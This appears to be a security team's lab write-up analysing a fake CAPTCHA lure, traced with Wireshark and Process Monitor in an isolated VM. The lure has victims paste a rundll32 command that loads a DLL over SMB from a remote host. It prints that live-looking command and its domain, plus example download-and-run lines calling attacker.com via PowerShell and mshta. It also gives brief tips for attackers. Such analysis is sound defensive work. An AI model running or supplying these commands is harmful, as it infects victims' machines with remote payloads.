# Technical Walkthrough - Fake CAPTCHA + SMB DLL Execution

## Lab Setup

### Environment Configuration

```
Host OS: Windows 10 (Build 19045)
Network: NAT (Isolated)
Memory: 4GB RAM
Storage: 50GB
Hypervisor: VMware

Monitoring Tools:
- Wireshark 
- Process Monitor
- Windows Event Viewer
- Autoruns 14.1
```

### Why This Configuration?

- **NAT Network:** Isolates the malicious traffic from your host/production networks
- **Process Monitor:** Captures file, registry, and network events in real-time
- **Wireshark:** Allows packet-level analysis of network communication
- **Event Viewer:** Provides Windows system-level logging

---

## Step-by-Step Analysis

### Step 1: Command Extraction

**Source:** Fake CAPTCHA webpage  
**Method:** Copied from clipboard instead of executing

```bash
rundll32.exe \\mempr-prim.inconprofitable.surf\9fd51fb7-b3ad-4c8f-bf05-b5423d14e06c\user_6747.google,run
```

**Initial Observations:**
- Uses legitimate Windows binary (`rundll32.exe`)
- Target is a remote UNC path (not local disk)
- Calling specific function: `run`
- Domain: `mempr-prim.inconprofitable.surf` (suspicious)

### Step 2: Pre-Execution Analysis

Before running anything, we analyzed:

```powershell
# Check rundll32 properties
Get-Command rundll32.exe
# Result: Legitimate Windows binary
# Location: C:\Windows\System32\rundll32.exe
# Signed: Yes (Microsoft)

# Check domain reputation
# mempr-prim.inconprofitable.surf
# - No known reputation
# - Recently registered domain
# - No DNS resolution in initial check
```

### Step 3: Lab Execution

**Process:**
1. Started Wireshark capture (filter: `dns or tcp.port == 445`)
2. Started Process Monitor
3. Opened Run dialog (`Win + R`)
4. Pasted command
5. Pressed Enter
6. Immediately closed Process Monitor and Wireshark

### Step 4: Network Traffic Analysis (Wireshark)

#### DNS Resolution Attempt

```
Frame 11:
  Source: 192.168.43.139 (Lab VM)
  Destination: 192.168.43.2 (Lab DNS server)
  Query Type: A
  Query: mempr-prim.inconprofitable.surf
  
Frame 12:
  Response: 104.21.68.248
  Type: Standard A record
  TTL: 300
```

**Interpretation:**
- DNS successfully resolved the domain
- Response came from lab DNS (not internet)
- IP address 104.21.68.248 belongs to Cloudflare CDN (AS13335)

#### TCP Connection Attempt (Critical)

```
Frame 14:
  Source: 192.168.43.139:52763
  Destination: 104.21.68.248:445
  Flags: [SYN]
  Status: SENT
  
Frame 15:
  Source: 104.21.68.248:445
  Destination: 192.168.43.139:52763
  Flags: [RST]
  Status: RECEIVED
  
Result: Connection FAILED
```

**Why This Matters:**

The TCP three-way handshake for SMB didn't complete:
- Lab VM sent `[SYN]` packet (request to connect)
- Remote host sent `[RST]` packet (connection reset)
- SMB session never established

**Possible Reasons:**
1. Port 445 is not open on the remote host
2. SMB service is not running
3. Firewall blocking inbound SMB
4. Attacker didn't set up proper infrastructure

#### Retransmission Evidence

```
Multiple [SYN] retransmissions observed at:
  - T+1.5s
  - T+3s
  - T+6s
  - T+12s

This indicates Windows attempting recovery.
Default SMB retry mechanism: exponential backoff
```

### Step 5: Process Execution Analysis (Process Monitor)

#### rundll32.exe Launch

```
Time: 16:50:47.823240800
Process Name: rundll32.exe
PID: 4276
Operation: Process Create
Path: C:\Windows\System32\rundll32.exe
Command Line: rundll32.exe \\mempr-prim.inconprofitable.surf\9fd51fb7-b3ad-4c8f-bf05-b5423d14e06c\user_6747.google,run
Result: SUCCESS
Parent PID: 2328 (explorer.exe)
```

**Analysis:**
- Process successfully created
- Parent process is explorer.exe (Run dialog)
- Command line parameters correctly parsed
- No immediate errors at process creation level

#### Child Process Activity

```
Parent: rundll32.exe (PID 4276)

Child Processes:
1. svchost.exe (various instances)
   - Result: SUCCESS
   - These are normal Windows background services
   
No suspicious child processes observed
No network-capable processes spawned from rundll32
No registry modifications
No file creation outside System32
```

**Key Finding:**
If the DLL payload had loaded successfully, we would expect:
- New child process from rundll32
- Network connections from the new process
- Potential registry modifications
- File drops to disk

**Absence of these indicates:** Payload never loaded

#### System Error Display

```
Process: rundll32.exe
Operation: Window Create
Time: 16:50:50.xxx
Message: "There was a problem starting 
          \\mempr-prim.inconprofitable.surf.9fd51fb7-b3ad-4c8f-bf05-b5423d14e06c\user_6747.google
          
          The file cannot be accessed by the system."

Result: Dialog displayed to user
```

**This error means:**
- Windows attempted to access the UNC path
- Path validation failed
- SMB share was unreachable
- Process continued but DLL load failed

---

## Failure Root Cause Analysis

### Why the Attack Failed

#### Primary Cause: Infrastructure Misconfiguration

The attacker likely:
1. Used a Cloudflare IP to host the SMB share
2. Didn't actually set up SMB on port 445
3. Possibly tried to use a web server (HTTP/HTTPS)
4. Expected the payload to be hosted elsewhere

**Evidence:**
- Cloudflare is a CDN and web service provider
- Typically uses ports 80, 443 for HTTP/HTTPS
- Port 445 (SMB) is not part of standard Cloudflare services
- The IP resolved, but SMB service was absent

#### Secondary Issues

1. **Domain Infrastructure**
   ```
   Domain: mempr-prim.inconprofitable.surf
   Registration: Likely temporary/throwaway
   No legitimate history
   ```

2. **Payload Hosting**
   ```
   Expected: SMB file share with DLL
   Actual: Cloudflare CDN edge node
   Result: Protocol mismatch → connection refused
   ```

3. **Operational Mistake**
   ```
   The attacker made a critical error:
   - Chose wrong infrastructure
   - Didn't verify SMB was accessible
   - Didn't test the attack chain
   ```

---

## What Would Have Happened If Successful

### Hypothetical Attack Success Scenario

```
Execution Timeline (if SMB was working):

T+0s:   rundll32.exe launches
T+0.5s: DNS resolution succeeds
T+1s:   SMB connection established
        Windows opens \\mempr-prim...\user_6747.google
        
T+1.5s: DLL file transferred over SMB
        Windows loads DLL into rundll32 process space
        
T+2s:   DLL entry point executed
        Attacker code runs with user privileges
        
T+2-5s: Payload execution
        Could establish reverse shell
        Download additional malware
        Create persistence mechanisms
        Steal credentials
        Move laterally to other systems
```

### Expected Indicators

In a successful attack, we would observe:

**Process Monitor:**
```
- Unexpected registry modifications
- DLL load events from UNC path
- New child processes (command shells, etc.)
- File creation in %TEMP%, %APPDATA%
- Network connections from rundll32
```

**Wireshark:**
```
- Established TCP connection on port 445
- SMB protocol packets (SMB negotiation)
- File transfer packets
- Possible C2 traffic after DLL loads
```

**Event Viewer:**
```
- Process Creation (Event 4688)
- Network Connection (Event 3)
- Registry Modification (Event 4657)
- Suspicious service creation
```

---

## Forensic Evidence Preservation

### What to Collect

```
1. Memory Dump
   - Captures RAM state
   - Useful for volatility analysis
   
2. Disk Image
   - Full forensic copy
   - Preserve deleted files
   
3. Network Logs
   - Full packet capture
   - Flow data
   
4. Event Logs
   - Windows Security log
   - Application logs
   - System logs
   
5. Process Artifacts
   - Running process list
   - Open handles
   - Network connections
```

### Collection Commands

```powershell
# Memory dump
wmic os get totalvisiblememorybytes /value

# Running processes
Get-Process | Export-Csv processes.csv

# Network connections
netstat -ano | Out-File netstat.txt

# Event logs
Get-WinEvent -FilterHashtable @{
    LogName='Security'
} | Export-Csv security_events.csv

# Registry hives
reg export HKLM hklm.reg
reg export HKCU hkcu.reg
```

---

## Comparison with Real-World Variants

### Similar Attacks in the Wild

#### Attack 1: BITSAdmin + PowerShell
```powershell
bitsadmin /create BG
bitsadmin /resume BG
PowerShell -Command "Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile C:\Temp\payload.exe"
```
**Difference:** Uses HTTP instead of SMB, more detectable

#### Attack 2: MSHTA + HTA File
```
mshta.exe http://attacker.com/malicious.hta
```
**Similarity:** Also uses trusted binary, but more monitored

#### Attack 3: Wmic + Payload
```
wmic.exe os call create "rundll32.exe C:\Windows\Temp\payload.dll"
```
**Similarity:** rundll32 execution, but local DLL

**Our Attack's Unique Aspects:**
1. SMB delivery (less common, less monitored)
2. Clipboard-based delivery (social engineering focused)
3. Fake CAPTCHA social engineering (context-specific)
4. Multi-layer attack (SE + executable + protocol)

---

## Lessons Learned

### For Attackers (Educational)

This attack demonstrates proper infrastructure is critical:
- Payload must be properly hosted
- Protocol must be correctly configured
- Service must actually be running
- Testing in isolated environment first is essential

### For Defenders

1. **Monitor SMB Closely**
   - Port 445 outbound is suspicious
   - Track SMB share access
   - Alert on failed SMB connections (they might retry)

2. **Track rundll32 Behavior**
   - Monitor command line arguments
   - Flag DLL loads from UNC paths
   - Alert on network connections from rundll32

3. **Educate Users**
   - Show real examples (like this)
   - Teach they'll never be asked to run commands
   - Emphasize pausing before execution

4. **Implement Defense in Depth**
   - No single control stops this
   - Combine network, endpoint, and user controls
   - Continuous monitoring essential

---

## Detection Testing

### How to Verify Your Detection

```powershell
# Test 1: Monitor rundll32 with network activity
# (Don't actually execute on production network!)

# Test 2: Verify SMB blocking works
ping 8.8.8.8  # Should work
nslookup google.com  # Should work
# (Attempt to SMB share should timeout/fail)

# Test 3: Check Process Monitor alerting
# Launch any legitimate .dll with rundll32
# Verify alert fires in SIEM

# Test 4: Verify Wireshark capture works
# Run tcpdump on isolated interface
# Verify port 445 traffic is logged
```

---

## Conclusion

This attack failed due to attacker incompetence, but the technique itself is solid. The combination of:
- Social engineering
- Legitimate binary abuse
- Unmonitored protocol (SMB)
- User interaction

...makes it dangerous and worth understanding for both defensive and educational purposes.

---

**Analysis Date:** May 2, 2026  
**Analyst:** Security Team  
**Status:** Complete
